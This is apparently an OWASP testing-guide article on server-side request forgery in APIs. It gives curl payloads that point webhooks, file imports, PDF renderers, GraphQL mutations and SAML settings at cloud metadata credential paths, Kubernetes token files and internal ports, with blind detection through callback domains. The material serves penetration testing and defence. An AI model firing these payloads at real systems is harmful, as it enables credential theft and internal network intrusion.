# Testing API Server-Side Request Forgery

|ID          |
|------------|
|WSTG-APIT-08|

## Summary

Server-Side Request Forgery (SSRF) in APIs occurs when the server fetches a URL or network resource specified by client input without validating the destination. APIs are especially exposed because they commonly accept URL parameters for webhooks, callbacks, file imports, PDF generation, link previews, and service-to-service integrations—entry points that traditional web applications rarely expose.

API SSRF differs from web application SSRF in several ways:

- **Asynchronous processing**: Webhook and callback registrations trigger server-side fetches minutes or hours after the initial request, making detection harder and creating blind SSRF scenarios by default.
- **Service mesh exposure**: APIs running in microservice architectures have direct access to internal service discovery, sidecar proxies, and cloud metadata endpoints.
- **Structured input**: URL parameters are embedded in JSON or XML request bodies rather than query strings, allowing injection in nested fields that input validation may miss.
- **Machine-to-machine context**: API consumers are often other services, so requests may carry elevated privileges or service account credentials.

For foundational SSRF testing techniques—including basic internal URL access, IP encoding bypasses, URL encoding bypasses, DNS rebinding, open redirect chains, and protocol switching—see [4.7.19 Testing for Server-Side Request Forgery (WSTG-INPV-19)](../07-Injection/19-Server-Side_Request_Forgery.md). This article covers API-specific entry points and testing methodology not addressed there.

## Test Objectives

- Identify API parameters that accept URLs, hostnames, or file paths the server fetches asynchronously or synchronously.
- Determine whether webhook, callback, and integration endpoints validate destination URLs before fetching.
- Verify whether cloud metadata endpoints are reachable through API SSRF vectors.
- Detect blind SSRF through out-of-band callbacks in asynchronous API flows.
- Test SSRF in document generation, file import, and GraphQL endpoints.

## How to Test

### Related Testing

The bypass techniques in [WSTG-INPV-19](../07-Injection/19-Server-Side_Request_Forgery.md) (IP encoding, URL encoding, DNS rebinding, redirect chains, protocol switching) apply to all SSRF vectors including those below. Test each API-specific entry point with those bypass methods after confirming the basic SSRF behavior described here.

### Identify API SSRF Entry Points

Review API documentation and observed traffic for parameters that accept URLs. API-specific parameter names and contexts include:

| Category | Common Parameters |
|----------|------------------|
| Webhooks | `webhookUrl`, `callbackUrl`, `notifyUrl`, `pingbackUrl` |
| File import | `importUrl`, `feedUrl`, `rssUrl`, `xmlUrl`, `sourceUrl` |
| Media | `imageUrl`, `avatarUrl`, `iconUrl`, `logoUrl`, `thumbnailUrl` |
| Documents | `templateUrl`, `pdfUrl`, `reportUrl`, `exportUrl` |
| Previews | `previewUrl`, `linkUrl`, `oembedUrl` |
| Integrations | `endpointUrl`, `apiUrl`, `serviceUrl`, `proxyUrl` |
| Connection test | `host` + `port` parameters in connectivity check endpoints |

Also examine endpoints that accept hostnames or IPs as separate parameters:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"host":"internal.example.com","port":8080}' \
  https://api.example.com/v1/connections/test
```

### Test Webhook and Callback Registration

Webhook endpoints register a URL that the server fetches later when an event occurs. This creates blind SSRF by design—the response is never returned to the caller.

#### 1. Register Internal URL as Webhook

```bash
# Register a webhook pointing to an internal service
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"event":"order.created","url":"http://127.0.0.1:8080/admin"}' \
  https://api.example.com/v1/webhooks
```

Trigger the event and observe whether the server attempts to reach the internal address. Use out-of-band detection (see [Detect Blind SSRF](#detect-blind-ssrf-via-out-of-band-channels)) if the server does not report delivery status.

#### 2. Test Webhook URL Validation Timing

Some APIs validate the webhook URL at registration time but not at delivery time:

```bash
# Step 1: Register with a valid external URL
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"event":"order.created","url":"https://valid.example.com/hook"}' \
  https://api.example.com/v1/webhooks

# Step 2: Update the webhook URL to an internal address
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  https://api.example.com/v1/webhooks/<WEBHOOK_ID>
```

Insecure behavior: the update succeeds and the server fetches the internal URL on the next event.

#### 3. Test Callback URL in Asynchronous Operations

APIs that process tasks asynchronously often accept a callback URL for result delivery:

```bash
# File processing with callback
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"fileId":"abc123","callbackUrl":"http://127.0.0.1:6379/"}' \
  https://api.example.com/v1/process

# Report generation with callback
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"reportType":"monthly","notifyUrl":"http://internal-api.local:3000/secrets"}' \
  https://api.example.com/v1/reports/generate
```

### Test API-to-API Integration SSRF

Microservice architectures route requests between services. API endpoints that proxy or forward requests to other services are SSRF vectors.

#### 1. Service Proxy Endpoints

```bash
# API gateway or proxy endpoint
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"service":"http://127.0.0.1:8500/v1/agent/members","method":"GET"}' \
  https://api.example.com/v1/proxy

# Health check that fetches upstream
curl -s -H "Authorization: Bearer <TOKEN>" \
  "https://api.example.com/v1/health?upstream=http://169.254.169.254/latest/meta-data/"
```

#### 2. Service Discovery Endpoints

In containerized environments, test access to service discovery and orchestration APIs:

```bash
# Kubernetes API
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"https://kubernetes.default.svc/api/v1/namespaces"}' \
  https://api.example.com/v1/fetch

# Consul
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://consul.service.consul:8500/v1/catalog/services"}' \
  https://api.example.com/v1/fetch

# Docker socket (if mounted)
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://127.0.0.1:2375/containers/json"}' \
  https://api.example.com/v1/fetch
```

### Test Cloud Metadata Access via API SSRF

Cloud-hosted APIs can reach instance metadata endpoints to harvest credentials. This is one of the highest-impact API SSRF scenarios.

#### 1. AWS Instance Metadata

```bash
# IMDSv1 (no token required)
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  https://api.example.com/v1/fetch

# IMDSv2 (requires PUT token — most SSRF payloads cannot perform this,
# but test if the server's HTTP library follows through)
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/latest/api/token"}' \
  https://api.example.com/v1/fetch
```

#### 2. GCP Metadata

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}' \
  https://api.example.com/v1/fetch
```

Note: GCP metadata requires the `Metadata-Flavor: Google` header. Test whether the server's HTTP client forwards custom headers or whether the metadata endpoint accepts requests without the header in certain configurations.

#### 3. Azure Metadata

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}' \
  https://api.example.com/v1/fetch
```

#### 4. Container-Specific Metadata

In ECS, EKS, and Fargate environments, metadata is available at the container credential endpoint:

```bash
# AWS ECS task metadata
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.170.2/v2/credentials/<GUID>"}' \
  https://api.example.com/v1/fetch

# Kubernetes service account token
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"file:///var/run/secrets/kubernetes.io/serviceaccount/token"}' \
  https://api.example.com/v1/fetch
```

### Test SSRF in File Import Endpoints

APIs that import data from external URLs are direct SSRF vectors:

```bash
# CSV/data import
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"source":"http://127.0.0.1:8080/internal/secrets","format":"csv"}' \
  https://api.example.com/v1/import

# XML/RSS feed import
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"feedUrl":"http://169.254.169.254/latest/meta-data/"}' \
  https://api.example.com/v1/feeds

# URL-based file upload (fetch from URL instead of multipart)
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"avatarUrl":"http://127.0.0.1:3000/admin/export"}' \
  https://api.example.com/v1/users/profile
```

Insecure behavior: the API fetches the URL and returns or stores the content from the internal service.

### Test SSRF in Document Generation Endpoints

APIs that generate PDFs, screenshots, or thumbnails from user-supplied content or URLs are a common SSRF vector because they use headless browsers or rendering engines that follow URLs.

```bash
# PDF generation with HTML content
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"htmlContent":"<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>"}' \
  https://api.example.com/v1/export/pdf -o response.pdf

# PDF generation with template URL
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"templateUrl":"http://127.0.0.1:8080/admin"}' \
  https://api.example.com/v1/export/pdf -o response.pdf

# Screenshot endpoint
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"screenshotUrl":"http://127.0.0.1:8080/admin"}' \
  https://api.example.com/v1/screenshots

# Link preview / unfurl
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://127.0.0.1:6379/"}' \
  https://api.example.com/v1/link-preview
```

Open the generated PDF or examine the preview response for content from the internal service.

### Test SSRF in GraphQL Endpoints

GraphQL APIs may accept URL arguments in queries or mutations, and batched queries can amplify SSRF:

```bash
# Single query with URL argument
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { status } }"}' \
  https://api.example.com/graphql

# Batched queries for port scanning via timing
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '[
    {"query":"mutation { importData(url: \"http://127.0.0.1:80/\") { status } }"},
    {"query":"mutation { importData(url: \"http://127.0.0.1:443/\") { status } }"},
    {"query":"mutation { importData(url: \"http://127.0.0.1:8080/\") { status } }"},
    {"query":"mutation { importData(url: \"http://127.0.0.1:3306/\") { status } }"},
    {"query":"mutation { importData(url: \"http://127.0.0.1:6379/\") { status } }"}
  ]' \
  https://api.example.com/graphql
```

Batched queries execute in parallel on many GraphQL servers, making timing-based port scanning faster and more reliable than sequential requests.

### Detect Blind SSRF via Out-of-Band Channels

Blind SSRF is the default in API webhook and callback patterns—the server-side response is never returned to the caller. Use out-of-band detection:

#### 1. HTTP Callback Detection

```bash
# Use a callback service (e.g., Burp Collaborator, interactsh)
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"webhookUrl":"https://<CALLBACK_ID>.oastify.com"}' \
  https://api.example.com/v1/webhooks
```

Check the callback service for an incoming HTTP request from the target server's IP address. The request confirms the server followed the URL.

#### 2. DNS-Only Detection

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://ssrf-test.<CALLBACK_ID>.oastify.com"}' \
  https://api.example.com/v1/fetch
```

A DNS query for the subdomain confirms the server resolved the hostname, even if the HTTP request was blocked by a firewall. This distinguishes "URL validated but not fetched" from "URL fetched but response blocked."

#### 3. Delayed Callback Detection

For asynchronous endpoints (webhooks, batch processing), monitor the callback service over an extended period (minutes to hours). The server may not fetch the URL until the registered event triggers:

```bash
# Register and trigger
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"event":"invoice.paid","url":"https://<CALLBACK_ID>.oastify.com/delayed"}' \
  https://api.example.com/v1/webhooks

# Trigger the event
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"invoiceId":"INV-001","status":"paid"}' \
  https://api.example.com/v1/invoices/INV-001/pay
```

### Test SSRF in OAuth and SAML Integration

API endpoints that integrate with identity providers may accept URLs that the server fetches during authentication flows:

```bash
# OAuth: manipulate redirect_uri to internal address
curl -s "https://api.example.com/oauth/authorize?\
client_id=<CLIENT>&\
redirect_uri=http://127.0.0.1:8080/capture&\
response_type=code&\
scope=read"

# OpenID Connect: manipulate discovery URL
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"issuer":"http://127.0.0.1:8080/.well-known/openid-configuration"}' \
  https://api.example.com/v1/identity-providers

# SAML: point metadata URL to internal service
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"metadataUrl":"http://169.254.169.254/latest/meta-data/"}' \
  https://api.example.com/v1/saml/configure
```

## Remediation

- Validate and sanitize all user-supplied URLs server-side before fetching. Use an allowlist of permitted schemes (`https` only when possible), hostnames, and ports.
- Resolve the hostname to an IP address and verify it is not a private, loopback, link-local, or metadata address before making the request. Re-validate after each redirect.
- Apply URL validation at both registration time and fetch time for webhook and callback URLs.
- Disable HTTP redirect following in server-side HTTP clients, or re-validate the destination after each redirect.
- Enforce a response size limit and timeout on all outbound requests.
- Run URL-fetching services in a network segment with no access to internal services or metadata endpoints.
- For cloud deployments, enforce IMDSv2 (which requires a PUT-based token request that most SSRF payloads cannot perform) and restrict metadata endpoint access to specific containers.
- Limit GraphQL query batching and apply rate limiting to mutations that accept URL parameters.
- For comprehensive bypass prevention techniques, see [WSTG-INPV-19](../07-Injection/19-Server-Side_Request_Forgery.md) and the [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## References

- [OWASP Testing Guide — Testing for SSRF (WSTG-INPV-19)](../07-Injection/19-Server-Side_Request_Forgery.md)
- [OWASP API Security Top 10 — API7:2023 Server-Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [CWE-441: Unintended Proxy or Intermediary (Confused Deputy)](https://cwe.mitre.org/data/definitions/441.html)
- [RFC 9110: HTTP Semantics](https://datatracker.ietf.org/doc/html/rfc9110)
- [PortSwigger SSRF Research](https://portswigger.net/web-security/ssrf)
